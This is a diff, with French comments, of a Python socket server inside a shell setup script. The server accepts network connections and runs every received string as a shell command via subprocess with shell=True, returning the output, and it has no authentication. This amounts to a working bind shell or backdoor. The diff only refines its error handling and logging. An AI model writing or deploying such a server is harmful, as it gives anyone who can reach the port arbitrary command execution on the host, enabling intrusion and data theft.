@@ -27,23 +27,37 @@ def start_server():
             client_socket, client_address = server_socket.accept()
             print(f"Connexion établie avec {client_address}")
             with client_socket:
-                while True:
-                    command = client_socket.recv(1024).decode("utf-8")
-                    if not command or command.lower() == "exit":
-                        print("Fermeture de la connexion.")
-                        break
+                try:
+                    while True:
+                        command = client_socket.recv(1024).decode("utf-8")
+                        if not command:
+                            print("Commande vide reçue, fermeture de la connexion.")
+                            break
 
-                    try:
-                        result = subprocess.check_output(
-                            command, shell=True, stderr=subprocess.STDOUT, text=True
-                        )
-                    except subprocess.CalledProcessError as e:
-                        result = f"Erreur lors de l'exécution : {e.output}"
+                        if command.lower() == "exit":
+                            print("Commande de déconnexion reçue.")
+                            break
 
-                    client_socket.sendall(result.encode("utf-8"))
+                        try:
+                            # Exécution de la commande
+                            result = subprocess.check_output(
+                                command, shell=True, stderr=subprocess.STDOUT, text=True
+                            )
+                        except subprocess.CalledProcessError as e:
+                            result = f"Erreur lors de l'exécution : {e.output}"
+                        except Exception as e:
+                            result = f"Erreur inattendue : {str(e)}"
+
+                        # Envoi du résultat au client
+                        client_socket.sendall(result.encode("utf-8"))
+                except Exception as e:
+                    print(f"Erreur avec le client {client_address} : {str(e)}")
+                finally:
+                    print(f"Fermeture de la connexion avec {client_address}")
 
 if __name__ == "__main__":
     start_server()
+
 EOF
 
 # Rendre le script exécutable
